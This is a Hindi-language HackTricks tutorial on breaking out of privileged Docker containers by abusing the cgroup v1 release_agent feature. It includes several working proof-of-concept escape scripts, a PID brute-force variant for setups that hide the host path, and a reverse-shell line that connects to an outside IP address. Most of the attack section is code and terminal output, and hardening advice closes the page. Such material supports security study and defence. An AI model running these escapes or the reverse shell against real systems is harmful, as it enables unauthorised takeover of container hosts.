<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


# `--privileged` फ्लैग

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` झंडा महत्वपूर्ण सुरक्षा चिंताओं को पेश करता है, और यह शोषण इसे सक्षम करके एक docker कंटेनर लॉन्च करने पर निर्भर करता है। इस झंडे का उपयोग करते समय, कंटेनर्स को सभी उपकरणों तक पूर्ण पहुँच होती है और seccomp, AppArmor, और Linux क्षमताओं से प्रतिबंध नहीं होते हैं।

वास्तव में, `--privileged` इस विधि के माध्यम से एक docker कंटेनर से बचने के लिए आवश्यक से कहीं अधिक अनुमतियाँ प्रदान करता है। वास्तविकता में, "केवल" आवश्यकताएँ हैं:

1. हमें कंटेनर के अंदर रूट के रूप में चलना चाहिए
2. कंटेनर को `SYS_ADMIN` Linux क्षमता के साथ चलाया जाना चाहिए
3. कंटेनर में AppArmor प्रोफ़ाइल की कमी होनी चाहिए, या अन्यथा `mount` syscall की अनुमति देनी चाहिए
4. cgroup v1 वर्चुअल फाइल सिस्टम को कंटेनर के अंदर पढ़ने-लिखने के लिए माउंट किया जाना चाहिए

`SYS_ADMIN` क्षमता एक कंटेनर को mount syscall करने की अनुमति देती है \(देखें [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). [Docker डिफ़ॉल्ट रूप से कंटेनर्स को सीमित क्षमताओं के साथ शुरू करता है](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) और `SYS_ADMIN` क्षमता को सक्षम नहीं करता है क्योंकि ऐसा करने के सुरक्षा जोखिम होते हैं।

इसके अलावा, Docker [डिफ़ॉल्ट रूप से कंटेनर्स को `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) नीति के साथ शुरू करता है, जो [mount syscall के उपयोग को रोकता है](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) यहाँ तक कि जब कंटेनर `SYS_ADMIN` के साथ चलाया जाता है।

एक कंटेनर इस तकनीक के लिए संवेदनशील होगा यदि इसे झंडों के साथ चलाया जाता है: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## प्रमाण के संकल्पना को तोड़ना

अब जब हम इस तकनीक का उपयोग करने के लिए आवश्यकताओं को समझते हैं और प्रमाण के संकल्पना शोषण को परिष्कृत कर चुके हैं, आइए इसे लाइन-दर-लाइन चलकर देखें कि यह कैसे काम करता है।

इस शोषण को ट्रिगर करने के लिए हमें एक cgroup की आवश्यकता है जहाँ हम एक `release_agent` फ़ाइल बना सकते हैं और cgroup में सभी प्रक्रियाओं को मारकर `release_agent` आह्वान को ट्रिगर कर सकते हैं। ऐसा करने का सबसे आसान तरीका है कि एक cgroup कंट्रोलर को माउंट करें और एक बाल cgroup बनाएं।

इसके लिए, हम एक `/tmp/cgrp` निर्देशिका बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup कंट्रोलर को माउंट करते हैं और एक बाल cgroup \(नाम “x” इस उदाहरण के उद्देश्यों के लिए\) बनाते हैं। हर cgroup कंट्रोलर का परीक्षण नहीं किया गया है, लेकिन यह तकनीक अधिकांश cgroup कंट्रोलर्स के साथ काम करनी चाहिए।

यदि आप साथ चल रहे हैं और "mount: /tmp/cgrp: special device cgroup does not exist" प्राप्त करते हैं, तो यह इसलिए है क्योंकि आपकी सेटअप में RDMA cgroup कंट्रोलर नहीं है। इसे ठीक करने के लिए `rdma` को `memory` में बदलें। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup कंट्रोलर्स वैश्विक संसाधन हैं जिन्हें विभिन्न अनुमतियों के साथ कई बार माउंट किया जा सकता है और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

हम नीचे “x” बाल cgroup निर्माण और इसकी निर्देशिका सूची देख सकते हैं।
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
आगे, हम "x" cgroup के रिलीज़ पर cgroup नोटिफिकेशन्स को सक्षम करते हैं उसकी `notify_on_release` फ़ाइल में 1 लिखकर। हम RDMA cgroup रिलीज़ एजेंट को भी सेट करते हैं ताकि वह `/cmd` स्क्रिप्ट को एक्जीक्यूट करे — जिसे हम बाद में कंटेनर में बनाएंगे — होस्ट पर `/cmd` स्क्रिप्ट पथ को `release_agent` फ़ाइल में लिखकर। इसे करने के लिए, हम कंटेनर का पथ होस्ट पर `/etc/mtab` फ़ाइल से प्राप्त करेंगे।

कंटेनर में हम जो फ़ाइलें जोड़ते हैं या संशोधित करते हैं, वे होस्ट पर मौजूद होती हैं, और दोनों दुनिया से उन्हें संशोधित करना संभव है: कंटेनर में पथ और होस्ट पर उनका पथ।

नीचे दिए गए ऑपरेशन्स को देखा जा सकता है:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ध्यान दें `/cmd` स्क्रिप्ट के पथ पर, जिसे हम होस्ट पर बनाने वाले हैं:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
अब, हम `/cmd` स्क्रिप्ट ऐसे बनाते हैं जिससे यह `ps aux` कमांड को एक्जीक्यूट करेगा और इसके आउटपुट को होस्ट पर आउटपुट फाइल के पूर्ण पथ को निर्दिष्ट करते हुए कंटेनर के `/output` में सेव करेगा। अंत में, हम `/cmd` स्क्रिप्ट को प्रिंट भी करते हैं ताकि इसकी सामग्री देख सकें:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हम "x" चाइल्ड cgroup के अंदर तुरंत समाप्त होने वाली प्रक्रिया को उत्पन्न करके हमला कर सकते हैं। `/bin/sh` प्रक्रिया बनाकर और उसके PID को "x" चाइल्ड cgroup डायरेक्टरी में `cgroup.procs` फाइल में लिखकर, `/bin/sh` के बाहर निकलने के बाद होस्ट पर स्क्रिप्ट निष्पादित होगी। होस्ट पर किया गया `ps aux` का आउटपुट फिर कंटेनर के अंदर `/output` फाइल में सहेजा जाता है:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` फ्लैग v2

पिछले PoCs तब अच्छे से काम करते हैं जब कंटेनर को एक storage-driver के साथ कॉन्फ़िगर किया गया हो जो माउंट पॉइंट का पूरा होस्ट पथ प्रकट करता है, उदाहरण के लिए `overlayfs`, हालांकि हाल ही में मैं कुछ कॉन्फ़िगरेशन से मिला जो स्पष्ट रूप से होस्ट फाइल सिस्टम माउंट पॉइंट को प्रकट नहीं करते थे।

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/) मूल रूप से कंटेनर की रूट फाइल सिस्टम को `9pfs` के ऊपर माउंट करता है। यह Kata Containers वर्चुअल मशीन में कंटेनर फाइल सिस्टम के स्थान के बारे में कोई जानकारी प्रकट नहीं करता है।

\* Kata Containers के बारे में अधिक जानकारी भविष्य के ब्लॉग पोस्ट में।

## Device Mapper
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
## एक वैकल्पिक PoC

स्पष्ट है कि इन मामलों में पर्याप्त जानकारी नहीं होती है कि होस्ट फाइल सिस्टम पर कंटेनर फाइलों का पथ पहचाना जा सके, इसलिए फेलिक्स का PoC जैसा है वैसा इस्तेमाल नहीं किया जा सकता। हालांकि, हम थोड़ी सूझबूझ के साथ यह हमला अभी भी अंजाम दे सकते हैं।

एक महत्वपूर्ण जानकारी जो आवश्यक है वह है कंटेनर होस्ट के सापेक्ष पूर्ण पथ, जिस फाइल को कंटेनर के भीतर निष्पादित करना है। कंटेनर के भीतर माउंट पॉइंट्स से इसे समझने में असमर्थ होने के कारण हमें और जगह देखना होगा।

### प्रोक बचाव के लिए <a id="proc-to-the-rescue"></a>

लिनक्स `/proc` प्स्यूडो-फाइलसिस्टम सिस्टम पर चल रही सभी प्रक्रियाओं के लिए कर्नेल प्रोसेस डेटा संरचनाओं को प्रकट करता है, जिनमें विभिन्न नेमस्पेस में चल रही प्रक्रियाएं भी शामिल हैं, उदाहरण के लिए एक कंटेनर के भीतर। इसे एक कंटेनर में कमांड चलाकर और होस्ट पर प्रोसेस की `/proc` डायरेक्टरी तक पहुंचकर दिखाया जा सकता है:
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_एक बात का जिक्र करना चाहूंगा, `/proc/<pid>/root` डेटा संरचना एक ऐसी चीज है जिसने मुझे बहुत लंबे समय तक भ्रमित किया, मैं कभी नहीं समझ पाया कि `/` के लिए एक प्रतीकात्मक लिंक होना क्यों उपयोगी है, जब तक कि मैंने मैन पेजेस में इसकी वास्तविक परिभाषा नहीं पढ़ी:_

> /proc/\[pid\]/root
>
> UNIX और Linux में प्रत्येक प्रक्रिया के लिए फाइल सिस्टम की जड़ का विचार समर्थित है, जिसे chroot\(2\) सिस्टम कॉल द्वारा सेट किया जाता है। यह फाइल एक प्रतीकात्मक लिंक है जो प्रक्रिया की जड़ निर्देशिका की ओर इशारा करता है, और exe और fd/\* की तरह ही व्यवहार करता है।
>
> हालांकि, ध्यान दें कि यह फाइल केवल एक प्रतीकात्मक लिंक नहीं है। यह फाइल सिस्टम का वही दृश्य प्रदान करती है \(सहित नामस्थान और प्रत्येक प्रक्रिया के माउंट्स का सेट\) जैसा कि प्रक्रिया स्वयं।

`/proc/<pid>/root` प्रतीकात्मक लिंक का उपयोग किसी भी फाइल के लिए होस्ट सापेक्ष पथ के रूप में किया जा सकता है जो कि एक कंटेनर के भीतर है:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
इससे हमले की आवश्यकता बदल जाती है, जिसमें कंटेनर के होस्ट के सापेक्ष पूर्ण पथ को जानने की बजाय, कंटेनर में चल रही _किसी भी_ प्रक्रिया की pid को जानना पर्याप्त होता है।

### Pid Bashing <a id="pid-bashing"></a>

यह वास्तव में आसान हिस्सा है, Linux में प्रक्रिया आईडी संख्यात्मक होती है और क्रमिक रूप से असाइन की जाती है। `init` प्रक्रिया को प्रक्रिया आईडी `1` असाइन की जाती है और सभी बाद की प्रक्रियाओं को वृद्धिशील आईडी दी जाती है। कंटेनर के अंदर की प्रक्रिया की होस्ट प्रक्रिया आईडी की पहचान करने के लिए, एक ब्रूट फोर्स वृद्धिशील खोज का उपयोग किया जा सकता है:
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
मेज़बान
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### सभी चीजों को एक साथ रखते हुए <a id="putting-it-all-together"></a>

इस हमले को पूरा करने के लिए ब्रूट फोर्स तकनीक का उपयोग करके `/proc/<pid>/root/payload.sh` पथ के लिए pid का अनुमान लगाया जा सकता है, प्रत्येक पुनरावृत्ति में अनुमानित pid पथ को cgroups `release_agent` फ़ाइल में लिखा जाता है, `release_agent` को ट्रिगर किया जाता है, और देखा जाता है कि क्या कोई आउटपुट फ़ाइल बनाई गई है।

इस तकनीक के साथ एकमात्र सावधानी यह है कि यह किसी भी तरह से सूक्ष्म नहीं है, और pid की गिनती को बहुत अधिक बढ़ा सकता है। चूंकि कोई भी लंबे समय तक चलने वाली प्रक्रियाएं चलाई नहीं जाती हैं, इसलिए इसे _चाहिए_ कि विश्वसनीयता के मुद्दे पैदा नहीं होंगे, लेकिन इस पर मेरे शब्दों को उद्धृत न करें।

नीचे दिया गया PoC इन तकनीकों को लागू करता है ताकि Felix के मूल PoC में पहली बार प्रस्तुत की गई तुलना में एक अधिक सामान्य हमला प्रदान किया जा सके, जो कि cgroups `release_agent` कार्यक्षमता का उपयोग करके एक विशेषाधिकार प्राप्त कंटेनर से बचने के लिए है:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
निष्पादित किए गए PoC को एक विशेषाधिकार प्राप्त कंटेनर के भीतर से निम्नलिखित जैसा आउटपुट प्रदान करना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# कंटेनरों को सुरक्षित रूप से उपयोग करें

Docker डिफ़ॉल्ट रूप से कंटेनरों को प्रतिबंधित और सीमित करता है। इन प्रतिबंधों को ढीला करने से सुरक्षा मुद्दे पैदा हो सकते हैं, भले ही `--privileged` फ्लैग की पूरी शक्ति के बिना। प्रत्येक अतिरिक्त अनुमति के प्रभाव को स्वीकार करना और कुल मिलाकर अनुमतियों को न्यूनतम आवश्यकता तक सीमित करना महत्वपूर्ण है।

कंटेनरों को सुरक्षित रखने के लिए:

* `--privileged` फ्लैग का उपयोग न करें या कंटेनर के अंदर [Docker सॉकेट माउंट न करें](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)। Docker सॉकेट कंटेनरों को स्पॉन करने की अनुमति देता है, इसलिए यह होस्ट का पूरा नियंत्रण लेने का एक आसान तरीका है, उदाहरण के लिए, `--privileged` फ्लैग के साथ एक और कंटेनर चलाकर।
* कंटेनर के अंदर रूट के रूप में न चलाएं। [अलग यूजर](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) का उपयोग करें या [यूजर नेमस्पेस](https://docs.docker.com/engine/security/userns-remap/) का। कंटेनर में रूट होस्ट पर वही होता है जब तक कि यूजर नेमस्पेस के साथ रीमैप नहीं किया जाता। यह मुख्य रूप से Linux नेमस्पेस, क्षमताओं और cgroups द्वारा हल्के रूप से प्रतिबंधित होता है।
* [सभी क्षमताओं को ड्रॉप करें](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) \(`--cap-drop=all`\) और केवल उन्हें सक्षम करें जो आवश्यक हैं \(`--cap-add=...`\)। कई कार्यभारों को किसी भी क्षमता की आवश्यकता नहीं होती है और उन्हें जोड़ने से संभावित हमले की गुंजाइश बढ़ जाती है।
* [“no-new-privileges” सुरक्षा विकल्प का उपयोग करें](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) ताकि प्रक्रियाएं अधिक विशेषाधिकार प्राप्त न कर सकें, उदाहरण के लिए suid बाइनरीज के माध्यम से।
* [कंटेनर के लिए उपलब्ध संसाधनों को सीमित करें](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)। संसाधन सीमाएं मशीन को सेवा से इनकार हमलों से बचा सकती हैं।
* [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) \(या SELinux\) प्रोफाइलों को समायोजित करें ताकि कंटेनर के लिए उपलब्ध क्रियाओं और syscalls को न्यूनतम आवश्यकता तक सीमित किया जा सके।
* [आधिकारिक docker इमेजेस](https://docs.docker.com/docker-hub/official_images/) का उपयोग करें या उनके आधार पर अपनी खुद की बनाएं। [बैकडोर्ड](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) इमेजेस को विरासत में न लें या उपयोग न करें।
* नियमित रूप से अपनी इमेजेस को सुरक्षा पैच लागू करने के लिए पुनः बनाएं। यह बिना कहे समझा जाता है।

# संदर्भ

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें।**
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
